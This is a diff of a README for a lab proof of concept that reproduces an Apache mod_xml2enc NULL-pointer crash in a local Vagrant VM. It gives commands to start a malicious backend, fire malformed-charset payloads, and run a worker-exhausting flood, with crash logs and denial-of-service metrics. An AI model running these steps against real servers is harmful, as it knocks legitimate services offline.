@@ -72,7 +72,7 @@ Key directives:
 | Component | Detail |
 |-----------|--------|
 | Runtime | Python 3 (any version) on the host machine |
-| Script | `attacker/poison.py` |
+| Script | `attacker/poison.py` (threaded — handles concurrent requests) |
 | Port | 9090 |
 | Protocol | HTTP |
 
@@ -140,85 +140,115 @@ The escape sequence `1b 24 42` (ESC $ B) switches the decoder into JIS X 0208 tw
 
 Same as Windows — use VirtualBox + Vagrant. No VMware plugin needed.
 
-## Setup Procedure
+## Running the Tests
 
-### Step 1: Clone the Repository
+### Test 1: Single Crash (Prove the Vulnerability)
 
+This test fires one payload and confirms Apache crashes with a segmentation fault.
+
+**Terminal 1 — Start the VM:**
 ```bash
-git clone https://github.com/<your-username>/CVE-2026-63686-apache-mod-xml2enc-poc.git
-cd CVE-2026-63686-apache-mod-xml2enc-poc
+vagrant up                           # Windows / Intel Mac
+vagrant up --provider=vmware_desktop  # Apple Silicon Mac
 ```
 
-### Step 2: Start the Target VM
-
-**Windows / Intel Mac (VirtualBox):**
-```bash
-vagrant up
-```
-
-**macOS Apple Silicon (VMware Fusion):**
-```bash
-vagrant up --provider=vmware_desktop
-```
-
-Vagrant creates a Debian 12 VM and runs the provisioning script which:
-1. Auto-detects the host gateway IP
-2. Installs Apache 2.4.68
-3. Enables modules: `proxy`, `proxy_http`, `proxy_html`, `xml2enc`
-4. Disables `deflate`
-5. Generates and deploys the reverse proxy vhost configuration
-6. Restarts Apache
-
-### Step 3: Verify Apache Configuration
-
-```bash
-vagrant ssh -c "sudo /usr/sbin/apachectl -M | grep -E 'proxy_html|xml2enc'"
-```
-
-Expected output:
-```
- proxy_html_module (shared)
- xml2enc_module (shared)
-```
-
-### Step 4: Start the Attacker Backend
-
-In a separate terminal:
+**Terminal 2 — Start the attacker:**
 ```bash
 python3 attacker/poison.py --port 9090
 ```
 
-Expected output:
-```
-============================================================
-  CVE-2026-63686 — Malicious Backend (Attacker)
-============================================================
-  Listening on 0.0.0.0:9090
-
-  Payload endpoints:
-    /         UTF-16LE orphan byte
-    /gb18030  GB18030 incomplete sequence
-    /iso2022  ISO-2022-JP dangling escape
-    /safe     Normal response (baseline)
-
-  Waiting for Apache to proxy requests here...
-============================================================
-```
-
-### Step 5: Fire the Exploit
-
-In another terminal:
-
-**Option A — Using curl directly:**
+**Terminal 3 — Fire a single payload:**
 ```bash
-curl http://localhost:8080/           # Payload 1: UTF-16LE
-curl http://localhost:8080/gb18030    # Payload 2: GB18030
-curl http://localhost:8080/iso2022    # Payload 3: ISO-2022-JP
+curl http://localhost:8080/
 ```
 
-**Option B — Using the PoC script:**
+**Terminal 3 — Check the crash:**
 ```bash
-# macOS / Linux / Git Bash on Windows
+vagrant ssh -c "sudo tail -5 /var/log/apache2/error.log"
+```
+
+**Expected output:**
+```
+[xml2enc:error] ... AH01445: Failed to convert input; trying it raw
+[core:notice]   ... AH00052: child pid XXXX exit signal Segmentation fault (11)
+```
+
+One worker died. The server is still up because other workers handle subsequent requests.
+
+### Test 2: Denial of Service (Exhaust the Worker Pool)
+
+This test sends a sustained flood of crash payloads while simultaneously testing if the server can respond to legitimate requests.
+
+**Terminal 2 — Make sure poison.py is still running** (from Test 1).
+
+**Terminal 3 — Limit Apache's worker pool** (makes DoS faster to demonstrate):
+```bash
+vagrant ssh -c "echo 'ServerLimit 1
+MaxRequestWorkers 1
+ThreadsPerChild 1' | sudo tee /etc/apache2/mods-available/mpm_event.conf && sudo systemctl restart apache2"
+```
+
+**Terminal 3 — Reset the logs:**
+```bash
+vagrant ssh -c "sudo truncate -s 0 /var/log/apache2/error.log"
+```
+
+**Terminal 3 — Run the DoS script:**
+```bash
+chmod +x dos.sh
+./dos.sh 15        # 15-second sustained flood
+```
+
+**Expected output:**
+```
+[Phase 1] Verifying server is alive...
+[+] Server is alive (HTTP 200)
+
+[Phase 2] Starting sustained crash flood for 15 seconds...
+
+[Phase 3] Testing /safe WHILE crash flood is active...
+
+  Request 1/10: HTTP 000 — NO RESPONSE (DoS working)
+  Request 2/10: HTTP 000 — NO RESPONSE (DoS working)
+  Request 3/10: HTTP 000 — NO RESPONSE (DoS working)
+  Request 4/10: HTTP 000 — NO RESPONSE (DoS working)
+  Request 5/10: HTTP 000 — NO RESPONSE (DoS working)
+  Request 6/10: HTTP 000 — NO RESPONSE (DoS working)
+  Request 7/10: HTTP 000 — NO RESPONSE (DoS working)
+  Request 8/10: HTTP 000 — NO RESPONSE (DoS working)
+  Request 9/10: HTTP 000 — NO RESPONSE (DoS working)
+  Request 10/10: HTTP 000 — NO RESPONSE (DoS working)
+
+  DoS CONFIRMED — 10/10 legitimate requests failed
+```
+
+**Terminal 3 — Check total crash count:**
+```bash
+vagrant ssh -c "sudo grep -c 'Segmentation fault' /var/log/apache2/error.log"
+```
+
+### Test 3: All Payload Variants
+
+Fire each charset payload individually to confirm they all trigger the crash.
+
+```bash
+# Reset logs
+vagrant ssh -c "sudo truncate -s 0 /var/log/apache2/error.log && sudo systemctl restart apache2"
+
+# Fire each payload
+curl http://localhost:8080/           # UTF-16LE
+sleep 2
+curl http://localhost:8080/gb18030    # GB18030
+sleep 2
+curl http://localhost:8080/iso2022    # ISO-2022-JP
+
+# Check results
+vagrant ssh -c "sudo grep 'Segmentation fault\|AH01445' /var/log/apache2/error.log"
+```
+
+Or use the automated PoC scripts:
+```bash
+# macOS / Linux / Git Bash
 chmod +x poc.sh
 ./poc.sh
 
@@ -226,62 +256,79 @@ chmod +x poc.sh
 .\poc.ps1
 ```
 
-### Step 6: Check the Crash
+## Monitoring
+
+Run any of these in a separate terminal during the tests:
+
+**Watch workers dying in real time:**
+```bash
+vagrant ssh -c "watch -n 0.5 'ps aux | grep apache2 | grep -v grep'"
+```
+
+**Stream the crash log:**
+```bash
+vagrant ssh -c "sudo tail -f /var/log/apache2/error.log"
+```
+
+**CPU, memory, processes:**
+```bash
+vagrant ssh -c "htop"
+```
+
+**One-shot crash count:**
+```bash
+vagrant ssh -c "sudo grep -c 'Segmentation fault' /var/log/apache2/error.log"
+```
+
+## Quick Reset (Between Tests)
+
+Reset the error log and restart Apache without rebuilding the VM:
 
 ```bash
-vagrant ssh -c "sudo tail -20 /var/log/apache2/error.log"
+vagrant ssh -c "sudo truncate -s 0 /var/log/apache2/error.log && sudo systemctl restart apache2"
 ```
 
 ## Success Case — Observed Output
 
-### Apache Error Log
-
-The following log entries were captured from `/var/log/apache2/error.log` on the target VM after firing the payloads:
+### Single Crash (Test 1)
 
 ```
 [Fri Nov 06 09:27:31.209625 2026] [xml2enc:error] [pid 3130:tid 3136]
     (70008)Partial results are valid but processing is incomplete:
     [client 10.0.2.2:38152] AH01445: Failed to convert input; trying it raw
 
-[Fri Nov 06 09:27:31.233258 2026] [xml2enc:error] [pid 3129:tid 3133]
-    (70008)Partial results are valid but processing is incomplete:
-    [client 10.0.2.2:38154] AH01445: Failed to convert input; trying it raw
-
 [Fri Nov 06 09:27:31.330435 2026] [core:notice] [pid 3126:tid 3126]
-    AH00052: child pid 3129 exit signal Segmentation fault (11)
-
-[Fri Nov 06 09:27:31.331456 2026] [core:notice] [pid 3126:tid 3126]
     AH00052: child pid 3130 exit signal Segmentation fault (11)
 ```
 
-### Interpretation
+**Interpretation:**
+1. `AH01445` — `mod_xml2enc` failed to transcode the malformed charset bytes via `iconv`.
+2. `AH00052 ... Segmentation fault (11)` — `mod_xml2enc` dereferenced a NULL pointer during the fallback path. The OS killed the worker with signal 11 (SIGSEGV).
 
-1. **`AH01445: Failed to convert input; trying it raw`** — `mod_xml2enc` detected that the `iconv` transcoding call returned an incomplete result. The malformed byte sequence could not be fully converted from the declared charset to UTF-8.
+### Denial of Service (Test 2)
 
-2. **`AH00052: child pid 3129 exit signal Segmentation fault (11)`** — After the failed conversion, `mod_xml2enc` attempted to fall back to raw passthrough but dereferenced a NULL pointer in the process. The operating system killed the Apache child process with signal 11 (SIGSEGV).
+| Metric | Value |
+|--------|-------|
+| Flood duration | 15 seconds |
+| Workers killed | 81 |
+| Crash rate | ~5.4 crashes/second |
+| Legitimate requests attempted | 10 |
+| Legitimate requests denied | **10/10 (100%)** |
 
-3. **Two child processes died** (PIDs 3129 and 3130), confirming that each poisoned request independently crashes the worker that handles it.
-
-### Result Summary
-
-| Payload | Endpoint | HTTP Response | Apache Worker | Log Entry |
-|---------|----------|---------------|---------------|-----------|
-| UTF-16LE | `/` | Connection closed | **Crashed (SIGSEGV)** | `child pid 3130 exit signal Segmentation fault (11)` |
-| GB18030 | `/gb18030` | 200 (raced before crash) | **Crashed (SIGSEGV)** | `child pid 3129 exit signal Segmentation fault (11)` |
-| ISO-2022-JP | `/iso2022` | 200 | Error logged | `AH01445: Failed to convert input` |
+The sustained flood killed workers faster than Apache could respawn them, denying all legitimate traffic.
 
 ## Cleanup
 
 ```bash
 # Stop the attacker: Ctrl+C in the poison.py terminal
 
-# Stop the VM
+# Stop the VM (preserves state)
 vagrant halt
 
-# Delete the VM entirely
+# Delete the VM entirely (clean slate)
 vagrant destroy -f
 ```
 
 ## Conclusion
 
-CVE-2026-63686 was successfully reproduced. Sending an HTTP response with a valid multi-byte charset header (`charset=UTF-16LE` or `charset=GB18030`) paired with a truncated body through Apache's `mod_proxy_html` + `mod_xml2enc` filter chain causes a NULL pointer dereference that crashes the Apache worker process. Repeated exploitation exhausts the worker pool and results in a complete denial of service.
+CVE-2026-63686 was successfully reproduced. Sending an HTTP response with a valid multi-byte charset header (`charset=UTF-16LE` or `charset=GB18030`) paired with a truncated body through Apache's `mod_proxy_html` + `mod_xml2enc` filter chain causes a NULL pointer dereference that crashes the Apache worker process. Sustained exploitation exhausts the worker pool and results in complete denial of service — 100% of legitimate requests were denied during the flood.
